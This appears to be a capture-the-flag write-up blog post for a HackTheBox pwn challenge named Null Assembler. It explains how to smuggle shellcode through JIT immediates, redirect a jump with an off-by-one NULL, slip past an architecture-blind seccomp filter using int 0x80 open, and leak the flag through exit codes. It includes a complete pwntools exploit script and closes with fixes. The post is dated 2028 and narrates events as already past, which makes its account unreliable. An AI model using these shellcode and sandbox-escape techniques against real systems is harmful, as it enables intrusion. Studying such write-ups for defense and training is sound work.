---
layout: post
title: "Null Assembler"
date: 2028-04-02 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, seccomp, shellcode, jit, int-0x80, off-by-one, pwntools]
description: "A toy JIT assembler emits your immediates straight into an executable page. Jump into the middle of an instruction to run smuggled shellcode, use a one-byte out-of-bounds NULL to redirect the jump, and beat an architecture-blind seccomp filter with a 32-bit int 0x80 open — then leak the flag one byte at a time through the process exit code."
---

## Overview

Null Assembler is a HackTheBox Pwn challenge (Medium) from Business CTF 2025. You are given a tiny "assembler": you type lines of a toy assembly using four virtual registers `h0`–`h3` and a handful of ops (`mov`, `str`, `ldr`, `cmp`, `add`, `sub`, `mul`, `div`, `je`, `jne`, `jmp`, `ret`). The program parses each line, **emits real x86-64 machine code** into an `mmap`'d buffer, installs a [seccomp](https://cwe.mitre.org/data/definitions/693.html) filter, `mprotect`s the buffer to `R-X`, and jumps into it. There is deliberately **no `syscall` mnemonic** — so the whole challenge is about coaxing arbitrary syscalls out of a language that never offers you one.

## The technique

The exploit chains four separate weaknesses.

**1. Immediate smuggling.** `mov h0,<imm32>` is emitted as `B8 <imm32>` (`mov eax, imm32`). Those four immediate bytes are entirely attacker-controlled and they land in executable memory. If you start executing *in the middle of an instruction* — on the immediate rather than on the `B8` opcode — those bytes run as code. Each `mov` gives you a 4-byte window; to chain windows you place ≤2 bytes of real shellcode followed by `EB 01` (`jmp +1`) in each immediate. The short jump hops over the next `B8` opcode and lands on the following immediate. That's the "atom":

```python
def create_atom(inst):
    a = asm(inst); assert len(a) <= 2
    return a + b'\xeb' + p8(1)   # 2 bytes of code + jmp over the next 0xB8
```

**2. Off-by-one NULL.** A `safe_strncpy` writes its terminating `\0` at `dst[dsize]` when the source is too long — one byte [out of bounds](https://cwe.mitre.org/data/definitions/787.html). A label stores its emit-index. Give a label the maximum length and that stray NULL overwrites the low byte of the stored index, turning e.g. `0x01xx` into `0x0100`. `jmp <label>` then jumps to offset `0x100` — the start of page 2, where you parked the smuggled first-stage shellcode. Page 1 is padded with filler `mov`/`cmp` so a zeroed low byte can never leave you at offset 0.

**3. Architecture-blind seccomp.** The filter checks the syscall *number* but never checks `seccomp_data.arch`:

```
A = seccomp_data.nr
A >= 0x40000000 ? KILL      # only blocks the x32 bit
A == 5   ? ALLOW           # meant for x86-64 fstat
A == 0   ? ALLOW           # read
A == 10  ? ALLOW           # mprotect
A == 231 ? ALLOW           # exit_group
else KILL
```

On x86-64 you can still issue 32-bit syscalls via `int 0x80`, and those use the *x86* syscall table — where number **5 is `open`**, not `fstat`. So an `int 0x80` with `eax=5` opens the flag file and sails straight through the `A==5` allow the author intended for `fstat`.

**4. No `write` → exit-code oracle.** `write` (x86-64 number 1) is not on the allowlist, so you cannot print the flag. The only observable channel is the 8-bit process exit status. The second stage `open`s the flag via `int 0x80`, `read`s it into memory, then calls `exit_group(flag_bytes[i])`. The challenge wrapper prints the exit code, giving one flag byte per connection.

## Solution

The full solver builds the two shellcode stages, lays them into the JIT with `mov`/`str`, triggers the off-by-one to jump to page 2, and leaks the flag byte-by-byte. The instance is one-connection-per-instance, so it re-provisions the container for every byte.

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'i386'

REGS = {'eax':'h0','ebx':'h1','ecx':'h2','edx':'h3'}
def create_atom(inst): a=asm(inst); assert len(a)<=2; return a+b'\xeb'+p8(1)
def mov(reg,value): return f'mov {REGS[reg]},{value}\n'.encode()
def cmp_(a,b): return f'cmp {REGS[a]},{REGS[b]}\n'.encode()
def strr(reg,idx): return f'str {REGS[reg]},{idx}\n'.encode()
def label(n): return n.encode()+b':\n'
def jmp(n): return f'jmp {n}\n'.encode()
def ret(): return b'ret\n'

def build_payload(idx):
    # first stage: mprotect(data, PAGE, RWX) then jump to the second stage
    sc1  = create_atom('push edi; push edi')
    sc1 += create_atom('mov esi,ebx')
    sc1 += create_atom('syscall')
    sc1 += create_atom('pop edi ; pop edi')
    sc1 += create_atom('jmp edi')
    # second stage: x86 int 0x80 open + read + exit_group(flag_bytes[idx])
    with context.local(arch='amd64', bits=64):
        sc2 = asm(f"""
        open:
            lea rbx,[rip+flag] ; mov ecx,0x0 ; mov eax,0x5 ; int 0x80
        read:
            mov edi,eax ; lea rsi,[rip+flag_bytes] ; mov rdx,0x100 ; mov eax,SYS_read ; syscall
        exit:
            xor edi,edi ; lea rsi,[rip+flag_bytes] ; mov dil,BYTE PTR[rsi+{idx}]
            mov eax,SYS_exit_group ; syscall
            flag: .string "./flag.txt"
            flag_bytes:
        """).ljust(0x50, asm('nop'))
    pl  = mov('eax',0)*41 + cmp_('eax','ebx')*17          # pad page 1
    for i in range(0,len(sc1),4): pl += mov('eax',u32(sc1[i:i+4].ljust(4,b'\x00')))
    for i in range(0,len(sc2),4):                          # stage 2 into the data section
        pl += mov('eax',u32(sc2[i:i+4].ljust(4,b'\x00'))); pl += strr('eax',i)
    pl += mov('eax',0xa) + mov('ebx',0x1000) + mov('edx',0x7)  # mprotect args
    pl += label('A'*0x20) + jmp('A'*0x20) + ret()          # max-len label off-by-one -> jump 0x100
    return pl

# for each idx: connect, send build_payload(idx), read the exit code = flag byte, stop at 0
```

Run it against the live instance and it prints `HTB{...}` one byte at a time.

## Why it worked

Two design mistakes compound. First, the JIT writes fully attacker-controlled immediates into a page it later makes executable, and x86's variable-length instructions let you decode from any offset — so "a restricted language with no syscall op" is still arbitrary code the moment you can land the instruction pointer mid-instruction. Second, the seccomp filter validates the syscall number on a kernel that speaks two ABIs but never pins the architecture, so `int 0x80` reinterprets an "allowed" number as an entirely different, dangerous call.

## Fix / defense

- In `safe_strncpy`, reserve room for the terminator: `dst[min(strlen(dst), dsize-1)] = 0`.
- Make architecture validation the **first** seccomp instruction: load `seccomp_data.arch`, and `KILL` anything that is not `AUDIT_ARCH_X86_64`. This closes the `int 0x80` path outright. Prefer a maintained allowlist generator (libseccomp) that pins the arch and per-arch numbers.
- Don't emit attacker-controlled immediates into an executable page. If a JIT is genuinely required, keep the code buffer W^X per-instruction and validate control-flow targets so execution can't start inside an immediate.

The flag is rendered `HTB{...}` — solved live against the instance.
